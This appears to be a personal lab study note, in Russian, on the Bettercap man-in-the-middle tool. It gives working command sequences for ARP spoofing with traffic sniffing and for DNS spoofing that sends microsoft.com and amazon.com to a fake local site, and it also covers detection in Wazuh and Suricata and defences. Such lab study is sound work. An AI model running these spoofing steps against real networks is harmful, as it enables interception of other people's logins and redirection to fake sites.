---
type: tool
name: Bettercap
category: MITM
platform: Kali Linux
language: Go
status: studying
tags: [arsenal, mitm, network, red-team]
mitre:
  - T1557.002  # ARP Cache Poisoning
  - T1557.001  # LLMNR/NBT-NS Poisoning
created: 2025-09-29
---

> [!info] 🛠️ ДОСЬЕ ИНСТРУМЕНТА
> **Название:** Bettercap
> **Категория:** MITM / Network Attacks
> **Платформа:** Kali Linux
> **Назначение:** ARP/DNS spoofing, сниффинг трафика, анализ сети
> **Статус изучения:** 🟡 В процессе
> **Лаба:** [[IP-Table]]

---

## 📖 I. ЧТО ЭТО

**Bettercap** — это модульный фреймворк для атак типа **Man-in-the-Middle (MITM)**. Заменяет устаревшие `ettercap` и `dsniff`. Написан на Go, работает через консоль.

**Основные возможности:**
- ARP-спуфинг (перенаправление трафика жертвы через себя).
- DNS-спуфинг (подмена ответов DNS).
- Сниффинг пакетов (перехват HTTP/HTTPS, паролей).
- Wi-Fi атаки (deauth, handshake capture).
- Просмотр всех устройств в сети.

---

## 🚀 II. БАЗОВЫЙ ЗАПУСК

```bash
sudo bettercap
```

После запуска ты попадёшь в интерактивную консоль Bettercap (приглашение `»`).

### Основные команды в консоли

| Команда | Что делает |
|---|---|
| `help` | Список всех модулей |
| `help <модуль>` | Справка по модулю |
| `net.probe on` | Начать обнаружение устройств |
| `net.show` | Показать найденные устройства |
| `set <параметр> <значение>` | Установить параметр |
| `get <модуль>.*` | Показать текущие настройки |
| `clear` | Очистить экран |
| `quit` | Выход |

---

## 🎯 III. СЦЕНАРИЙ №1: ПРОСМОТР УСТРОЙСТВ В СЕТИ

> [!quote] Задача
> Увидеть все устройства в локальной сети, включая скрытые.

```bash
sudo bettercap
```
В консоли:
```
net.probe on
net.show
```

**Что увидишь:** таблицу IP → MAC → производитель → имя хоста.

> [!tip] Совет
> `net.probe on` работает через ARP, поэтому найдёт даже те устройства, которые блокируют ICMP (например, Windows с брандмауэром).

---

## 🎯 IV. СЦЕНАРИЙ №2: ARP-SPOOFING (MITM)

> [!warning] Условие
> Включи пересылку пакетов, иначе жертва потеряет интернет.
> ```bash
> echo 1 > /proc/sys/net/ipv4/ip_forward
> ```

### Полная последовательность

```bash
# 1. Запуск
sudo bettercap

# 2. В консоли bettercap:
net.probe on
net.show

# 3. Выбор цели
set arp.spoof.targets 192.168.56.20

# 4. Запуск ARP-спуфинга
arp.spoof on

# 5. Сниффинг трафика
net.sniff on
```

**Что произойдёт:** весь трафик жертвы пойдёт через твою Kali. Ты увидишь логины, HTTP-запросы, DNS-запросы.

### Остановка

```
arp.spoof off
net.sniff off
```

---

## 🎯 V. СЦЕНАРИЙ №3: DNS-SPOOFING (ПОДМЕНА САЙТА)

> [!danger] Сложность
> DNS-спуфинг требует **одновременной** работы Apache (поддельный сайт) и Bettercap.

### Шаг 1: Поднять веб-сервер

```bash
sudo service apache2 start
sudo systemctl status apache2
```

Замени стандартную страницу на свою:
```bash
sudo nano /var/www/html/index.html
```

### Шаг 2: Настроить Bettercap

В консоли:
```
set dns.spoof.domains microsoft.com,amazon.com
dns.spoof on
```

### Шаг 3: Проверка

На **жертве** (например, Windows 10) открой браузер → введи `microsoft.com`. Его должно перенаправить на твою Kali с поддельным сайтом.

### Остановка

```bash
sudo service apache2 stop
sudo pkill -9 apache2
```

---

## 📋 VI. УПРАВЛЕНИЕ APACHE2

| Команда | Действие |
|---|---|
| `sudo systemctl start apache2` | Запустить |
| `sudo systemctl stop apache2` | Остановить |
| `sudo systemctl restart apache2` | Перезапустить |
| `sudo systemctl reload apache2` | Перезагрузить конфиг без остановки |
| `sudo systemctl status apache2` | Статус |
| `sudo systemctl enable apache2` | Автозагрузка при старте |
| `sudo systemctl disable apache2` | Отключить автозагрузку |
| `sudo pkill -9 apache2` | Принудительно убить все процессы |

---

## 🛡️ VII. ДЕТЕКТ В WAZUH

> [!danger] Что должен поймать защитник
> **MITRE Techniques:**
> - **T1557.002** — ARP Cache Poisoning
> - **T1557.001** — LLMNR/NBT-NS Poisoning
> - **T1040** — Network Sniffing
> - **T1584.004** — Compromise Infrastructure: Server

### Что видно в логах

| Источник | Что искать |
|---|---|
| **Suricata / Zeek** | ARP-аномалии, дублирующиеся MAC |
| **Wazuh** | Rule 5104 (port scan), аномалии ARP |
| **Sysmon** | Изменения ARP-таблицы |
| **Маршрутизатор** | MAC-flapping в логах |

### Проверка

Запусти ARP-спуфинг из Kali → на Ubuntu проверь `arp -a` → MAC-адрес шлюза **изменился** на MAC Kali.

> [!info] Как защититься
> - Dynamic ARP Inspection (DAI) на коммутаторах.
> - Статические ARP-записи для шлюза.
> - Обнаружение дублирующихся MAC через Suricata.

---

## 🩺 VIII. ТРОУБЛШУТИНГ

### Bettercap не устанавливается

```bash
# Вариант 1
sudo apt --fix-broken install
sudo apt install bettercap

# Вариант 2 (вручную)
wget http://kali.download/kali/pool/main/b/bettercap-caplets/bettercap-caplets_0+git20240106-2kali1_all.deb
sudo apt update
sudo apt install bettercap
```

### Жертва потеряла интернет
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
Включи перед атакой.

### Не вижу устройств в сети
- Убедись, что ты в той же подсети.
- Проверь `net.probe on` (не только `net.show`).
- Проверь, что сетевой адаптер в режиме **Bridge** или **Host-only**.

---

## 🔗 IX. СВЯЗИ

- **Инструменты:** [[ettercap]], [[wireshark]], [[nmap]]
- **Техники:** [[T1557]], [[T1040]], [[T1046]]
- **Лаба:** [[IP-Table]]
- **Жертвы:** [[Ubuntu Server]], [[Windows 10]]
- **Защита:** [[Wazuh]]

---

## 📚 X. ЧТО ИЗУЧИТЬ ДАЛЬШЕ

- [ ] SSL-strip атака (понижение HTTPS до HTTP)
- [ ] Wi-Fi deauth через `wifi.deauth`
- [ ] Caplet-скрипты (автоматизация)
- [ ] Интеграция с Burp Suite
- [ ] Детект ARP-спуфинга в Suricata

---

> [!abstract] 🐍 HYDRA DOMINATUS
> *Vigilo. Vexo. Vinco.*
> *Инструмент без понимания детекта — оружие без прицела.*